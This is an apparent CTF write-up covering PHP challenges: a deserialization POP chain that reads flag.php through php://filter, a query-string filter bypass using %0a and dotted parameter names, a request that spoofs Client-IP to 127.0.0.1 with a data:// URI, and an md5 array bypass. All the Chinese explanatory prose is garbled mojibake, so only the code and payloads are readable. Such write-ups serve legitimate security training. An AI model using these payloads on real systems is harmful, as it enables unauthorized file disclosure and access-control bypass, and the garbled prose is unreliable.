<p>ç”¨å›¾ç‰‡ä¸Šçš„å¯†ç æ‰“å¼€ZIPå‹ç¼©åŒ…ã€‚å‘ç°æ–‡æ¡£ä¿¡æ¯ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">127</span></span><br><span class="line"><span class="number">255</span></span><br><span class="line"><span class="number">63</span></span><br><span class="line"><span class="number">191</span></span><br><span class="line"><span class="number">127</span></span><br><span class="line"><span class="number">191</span></span><br><span class="line"><span class="number">63</span></span><br><span class="line"><span class="number">127</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>è§‚å¯Ÿå¯çŸ¥æ–‡æ¡£ä¸­åªå«æœ‰ <strong>127 255 63 191</strong> è¿™å››ä¸ªæ•°å­—ï¼Œå°†è¿™å››ä¸ªæ•°å­—è½¬åŒ–ä¸ºäºŒè¿›åˆ¶ï¼Œå¯ä»¥çœ‹åˆ°è¿™å››ä¸ªæ•°å­—çš„äºŒè¿›åˆ¶å½¢å¼ä¸­ <strong>åªæœ‰æœ€é«˜ä¸¤ä½çš„äºŒè¿›åˆ¶æ•°ä¸åŒ</strong> ï¼Œå°†å…¶æœ€é«˜ä¸¤ä½æå–å‡ºæ¥ç»„åˆåœ¨ä¸€èµ·è½¬åŒ–ä¸ºASCIIï¼Œå¯ä»¥å¾—åˆ°rarå¯†ç ï¼š</p>
<p>è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = open(<span class="string">&#x27;../out.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">a = f.readlines()</span><br><span class="line">p = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">	p.append(int(i))</span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">	<span class="keyword">if</span> i ==<span class="number">63</span>:</span><br><span class="line">		a = <span class="string">&#x27;00&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> i== <span class="number">127</span>:</span><br><span class="line">		a= <span class="string">&#x27;01&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> i== <span class="number">191</span>:</span><br><span class="line">		a=<span class="string">&#x27;10&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> i== <span class="number">255</span>:</span><br><span class="line">		a=<span class="string">&#x27;11&#x27;</span></span><br><span class="line">	s +=a</span><br><span class="line"></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(s),<span class="number">8</span>):</span><br><span class="line">	result += chr(int(s[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p>åˆ°raråŒ…çš„è§£å‹å¯†ç ï¼š<strong>0ac1fe6b77be5dbe</strong></p>
<p>è§£å‹å¯ä»¥å¾—åˆ°ä¸€ä¸ªzipåŒ…ï¼Œçœ‹zipåŒ…é‡Œçš„å†…å®¹(é‡Œé¢éƒ½æ˜¯xml)å¯ä»¥çŸ¥é“è¿™æ˜¯ä¸€ä¸ª <strong>docx</strong> æ–‡ä»¶ï¼Œæ”¹åç¼€ä¸ºdocxå¾—åˆ°æœ€ç»ˆçš„æ–‡ä»¶ã€‚</p>
<p>å°†æ–‡ä»¶å†…å®¹å…¨é€‰æ”¹ä¸ºæ·±è‰²ï¼Œå¯ä»¥çœ‹åˆ°åœ¨æ–‡æ¡£çš„æœ€ä¸‹æ–¹è—æœ‰å‡ ä¸²å­—ç¬¦</p>
<img src="http://img.kawhi.xyz/image-20200424212849538.png" alt="image-20200424212849538" style="high:80%;width:80%;" />

<p>å†base64è§£å¯†ï¼š</p>
<img src="http://img.kawhi.xyz/image-20200424212915052.png" alt="image-20200424212915052" style="high:80%;width:80%;" />

<h3 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a><strong>ezpop</strong></h3><p>é¦–å…ˆè¯´ä¸€ä¸‹</p>
<p>PHPç±»ä¸­çš„<code>__get</code>å’Œ<code>__set</code>å‡½æ•°ã€‚</p>
<p>å½“è¯•å›¾è·å–ä¸€ä¸ªä¸å¯è¾¾å±æ€§æ—¶(æ¯”å¦‚private)ï¼Œç±»ä¼šè‡ªåŠ¨è°ƒç”¨<code>__get</code>å‡½æ•°ã€‚</p>
<p>å½“è¯•å›¾è®¾ç½®ä¸€ä¸ªä¸å¯è¾¾å±æ€§æ—¶(æ¯”å¦‚private)ï¼Œç±»ä¼šè‡ªåŠ¨è°ƒç”¨<code>__set</code>å‡½æ•°ã€‚</p>
<p>ä¸¾ä¸€ä¸ªä¾‹å­ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&#x27;å‘¨ä¼¯é€š&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> $sex = <span class="string">&#x27;ç”·&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$class = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="keyword">echo</span> $class-&gt;sex;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œ$sexå£°æ˜äº†ç§ç”¨å˜é‡ï¼Œç§æœ‰å˜é‡æˆ–æ–¹æ³•åœ¨ç±»å®ä¾‹åŒ–æ˜¯ä¸èƒ½ç›´æ¥è®¿é—®çš„ï¼Œæ‰€ä»¥ä¸Šé¢ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Fatal error: Uncaught Error: Cannot access private property Person::$sex </span><br></pre></td></tr></table></figure>

<p>ç„¶åæ”¹é€ ä¸€ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&#x27;å‘¨ä¼¯é€š&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> $sex = <span class="string">&#x27;ç”·&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$name</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;ä¸ªäººä¿¡æ¯:&#x27;</span>.$name.<span class="keyword">$this</span>-&gt;sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$class = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="keyword">echo</span> $class-&gt;sex;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¾“å‡ºçš„æ˜¯ä¸ªäººä¿¡æ¯:sexç”·ã€‚</p>
<p>å¯ä»¥çœ‹å‡º<code>__get</code>æ–¹æ³•è‡ªåŠ¨è°ƒç”¨äº†ï¼Œå¹¶å¯ä»¥è®¿é—®ç§æœ‰å˜é‡ã€‚</p>
<p>å†æ¥çœ‹ä¸€ä¸‹<code>__set</code>å‡½æ•°ï¼ŒåŒæ ·ä¹Ÿæ˜¯å…ˆä½¿ç”¨å¯è¾¾çš„ç§æœ‰å±æ€§ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&#x27;å‘¨ä¼¯é€š&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> $sex = <span class="string">&#x27;ç”·&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params">$name, $val</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;ä¸ªäººä¿¡æ¯:&#x27;</span>.$name. $val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$class = <span class="keyword">new</span> Person();</span><br><span class="line">$class-&gt;sex = <span class="string">&#x27;å¥³&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ä¸ªäººä¿¡æ¯:sexå¥³</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°å› ä¸ºè®¾ç½®äº†ä¸å¯è¾¾å±æ€§$sexï¼Œæ‰€ä»¥æˆåŠŸè°ƒç”¨äº†<code>__set</code>å‡½æ•°å¹¶è¾“å‡ºã€‚</p>
<p><code>__invoke()</code> å‡½æ•°ä¼šåœ¨ä¸€ä¸ªç±»è¢«å½“æˆå‡½æ•°è°ƒç”¨æ—¶è¢«è§¦å‘ã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CallableClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params">$param1, $param2</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        var_dump($param1,$param2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj  = <span class="keyword">new</span> CallableClass();</span><br><span class="line">$obj(<span class="number">123</span>, <span class="number">456</span>);</span><br><span class="line">var_dump(is_callable($obj));</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">int(<span class="number">123</span>)</span><br><span class="line">int(<span class="number">456</span>)</span><br><span class="line">bool(true)</span><br></pre></td></tr></table></figure>

<p>å†æ¥çœ‹çœ‹è¿™é“é¢˜ç›®</p>
<h4 id="é¢˜ç›®æºç "><a href="#é¢˜ç›®æºç " class="headerlink" title="é¢˜ç›®æºç "></a><strong>é¢˜ç›®æºç </strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line">&lt;?php</span><br><span class="line">//flag <span class="keyword">is</span> <span class="keyword">in</span> flag.php</span><br><span class="line">//WTF IS THIS?</span><br><span class="line">//Learn From https://ctf.ieki.xyz/library/php.html<span class="comment">#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line">//And Crack It!</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=<span class="string">&#x27;index.php&#x27;</span>)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line"><span class="meta">    @unserialize($_GET[&#x27;pop&#x27;]);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=new Show;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>ååºåˆ—åŒ–ç›´æ¥åˆ†æï¼Œæ„é€ popé“¾ï¼Œåˆ†æä¸€ä¸‹ä¸‰ä¸ªç±»ã€‚</p>
<h4 id="Modifierç±»"><a href="#Modifierç±»" class="headerlink" title="Modifierç±»"></a><strong>Modifierç±»</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°<code>include</code>å‡½æ•°ï¼Œæ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¼ªåè®®è¯»å–æ³¨é‡Šä¸­flag.phpä¸­çš„å†…å®¹ã€‚</p>
<p>è¿™é‡Œæœ‰é­”æ³•æ–¹æ³•<code>__invoke</code>å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ï¼Œæ‰€ä»¥åœ¨è„šæœ¬ä¸­ï¼Œè¦æŠŠModifierç±»è°ƒç”¨ä¸ºå‡½æ•°ã€‚</p>
<h4 id="Showç±»"><a href="#Showç±»" class="headerlink" title="Showç±»"></a><strong>Showç±»</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=<span class="string">&#x27;index.php&#x27;</span>)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>__construct</code>æ–¹æ³•ï¼Œæ¥æ”¶å‚æ•°<code>$file</code>ï¼Œ<code>$this-&gt;source = $file</code>å°†<code>$file</code>çš„å€¼èµ‹ç»™<code>source</code>ã€‚è€Œ<code>$file</code>çš„å€¼ç›´æ¥å°±æ˜¯<code>index.php</code>ï¼Œæ‰€ä»¥è¿˜æ˜¯è¾“å‡º<code>index.php</code>ã€‚</li>
<li><code>__toString</code>æ–¹æ³•ï¼Œå½“å‰å¯¹è±¡è®¿é—®<code>str</code>å†è®¿é—®<code>source</code>ï¼Œç„¶åè¿”å›è¿™ä¸ªå€¼ï¼Œå°±æ˜¯æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘ã€‚</li>
<li><code>__wakeup</code>æ–¹æ³•ï¼Œä½¿ç”¨ååºåˆ—åŒ–çš„æ—¶å€™è§¦å‘ï¼Œè¿‡æ»¤ä¸€äº›åè®®ï¼Œä½†æ˜¯æ˜¾è€Œæ˜“è§å¯ä»¥ç”¨<code>filter</code>ã€‚</li>
</ul>
<h4 id="Testç±»"><a href="#Testç±»" class="headerlink" title="Testç±»"></a><strong>Testç±»</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>__construct</code>æ–¹æ³•ï¼ŒæŠŠpå¯¹è±¡å˜æˆä¸€ä¸ªæ•°ç»„ã€‚</li>
<li><code>__get</code>æ–¹æ³•ï¼Œä»ä¸å¯è®¿é—®çš„å±æ€§ä¸­è¯»å–æ•°æ®ä¼šè§¦å‘ã€‚</li>
</ul>
<p>ç„¶åå¼€å§‹æ„é€ popé“¾ï¼š</p>
<p>å› ä¸ºæœ€ç»ˆæ˜¯æƒ³è°ƒç”¨æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œè¯»å–flag.phpã€‚æ‰€ä»¥è¦è§¦å‘<code>__invoke</code>ã€‚</p>
<p>è€Œ<code>__get</code>å°†å¯¹è±¡pä½œä¸ºå‡½æ•°è°ƒç”¨ï¼Œå°†på®ä¾‹åŒ–ä¸º<code>Modifier</code>ç±»ï¼Œä»è€Œè§¦å‘<code>__invoke</code>ã€‚</p>
<p>ç„¶å<code>__toString</code>è®¿é—®<code>str</code>çš„<code>source</code>å±æ€§ï¼Œå¦‚æœå°†strå®ä¾‹åŒ–ä¸ºTestï¼Œå› ä¸ºTestç±»ä¸­ä¸å«sourceå±æ€§ï¼Œä»è€Œè§¦å‘<code>__get</code>æ–¹æ³•ã€‚</p>
<p><code>__wakeup</code>æŠŠå¯¹è±¡å½“æˆå­—ç¬¦ä¸²å¤„ç†(åšåŒ¹é…çš„æ—¶å€™)ï¼Œè§¦å‘<code>__toString</code>ã€‚</p>
<p>æœ€åæ˜¯ååºåˆ—åŒ–è§¦å‘<code>__wakeup</code>ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file)&#123;</span><br><span class="line">    $this-&gt;source = $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Show(<span class="string">&#x27;abc&#x27;</span>);</span><br><span class="line">$a-&gt;str = new Test();</span><br><span class="line">$a-&gt;str-&gt;p = new Modifier();</span><br><span class="line">$b = new Show($a);//å°†å­—ç¬¦ä¸²æ‰“å°å‡ºæ¥</span><br><span class="line">echo urlencode(serialize($b));</span><br></pre></td></tr></table></figure>

<p>ç„¶åå¾—åˆ°çš„æ˜¯ä¸€ä¸²base64ï¼Œè§£ç å³å¯å¾—åˆ°flagã€‚</p>
<h3 id="å¥—å¨ƒ"><a href="#å¥—å¨ƒ" class="headerlink" title="å¥—å¨ƒ"></a><strong>å¥—å¨ƒ</strong></h3><p>F12æŸ¥çœ‹åˆ°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$query = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span>( substr_count($query, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">      die(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="keyword">if</span>($_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, $_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">      echo <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆæ˜¯å¯¹å­—ç¬¦ä¸²çš„ä¸‹åˆ’çº¿è¿›è¡Œç»Ÿè®¡ï¼Œå¦‚æœå¤§äº0å°±ç›´æ¥die()</p>
<p>ä½†æ˜¯ä¸‹é¢éœ€è¦æ¥æ”¶ä¸€ä¸ªåŒ…å«ä¸‹åˆ’çº¿çš„å‚æ•°b_u_p_tï¼Œè€Œä¸”å®ƒä¸èƒ½ç­‰äº23333è€Œæ­£åˆ™åŒ¹é…å´è¦æœ‰23333ã€‚è¿™é‡Œç›´æ¥ç”¨%0aå¯ä»¥ç»•è¿‡ã€‚è€Œphpå‚æ•°ï¼Œç©ºæ ¼å’Œç‚¹éƒ½ä¼šå˜æˆä¸‹åˆ’çº¿_ã€‚</p>
<p><strong>payload</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://ecf196f2-c27e-427a-aecc-31e4ee6a3a28.merak-ctf.site/?b.u.p.t=23333%0a</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°secrettw.phpæ–‡ä»¶åã€‚</p>
<p>å³é”®çœ‹æºç å­˜åœ¨ä¸€ä¸ªjsfuckï¼Œç›´æ¥ä¸¢è°·æ­Œæµè§ˆå™¨è§£ç å¾— <code>post me Merak</code>ã€‚</p>
<p>postæäº¤Merakå¾—æºç </p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"> error_reporting(<span class="number">0</span>); </span><br><span class="line"> include <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line"> ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"> include <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"> <span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">     highlight_file(__FILE__); </span><br><span class="line">     die(); </span><br><span class="line"> &#125; </span><br><span class="line"> function change($v)&#123; </span><br><span class="line">     $v = base64_decode($v); </span><br><span class="line">     $re = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">     <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">         $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">     &#125; </span><br><span class="line">     <span class="keyword">return</span> $re; </span><br><span class="line"> &#125;</span><br><span class="line"> echo <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"> $ip = getIp();</span><br><span class="line"> <span class="keyword">if</span>($ip!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"> echo <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.$ip;</span><br><span class="line"> <span class="keyword">if</span>($ip === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents($_GET[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"> echo <span class="string">&quot;Your REQUEST is:&quot;</span>.change($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"> echo file_get_contents(change($_GET[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"> ?&gt;  </span><br></pre></td></tr></table></figure>

<p>ç»•è¿‡IPçš„æ–¹æ³•<code>Client-IP: 127.0.0.1</code>ï¼Œä½¿ç”¨dataåè®®å»ç»•è¿‡<code>file_get_contents</code>ã€‚</p>
<p>é€†å‘changeå‡½æ•°</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function dechange($v)&#123;</span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($re);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo dechange(<span class="string">&#x27;todat is a happy day&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>exp</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">GET /secrettw.php?2333=data:text/html;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=&amp;file=ZmpdYSZmXGI= HTTP/1.1</span><br><span class="line">Host: <span class="number">17409</span>a10<span class="number">-8159</span><span class="number">-4621</span>-ac69<span class="number">-576</span>be7b7bd12.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">76.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">76.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Client-IP: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>

<h3 id="PYwebsite"><a href="#PYwebsite" class="headerlink" title="PYwebsite"></a>PYwebsite</h3><p>XFFç»•è¿‡</p>
<h3 id="ez-bypass"><a href="#ez-bypass" class="headerlink" title="ez_bypass"></a>ez_bypass</h3><p>æºç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">include <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">$flag=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;isset($_GET[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        echo <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                     highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                     die(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     echo <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                echo <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        echo <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    die(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€å±‚çš„md5ç”¨æ•°ç»„ç»•è¿‡ï¼Œ<code>?gg[]=1&amp;id[]=2</code>ï¼Œç¬¬äºŒå±‚passwdæ˜¯1234567aã€‚</p>
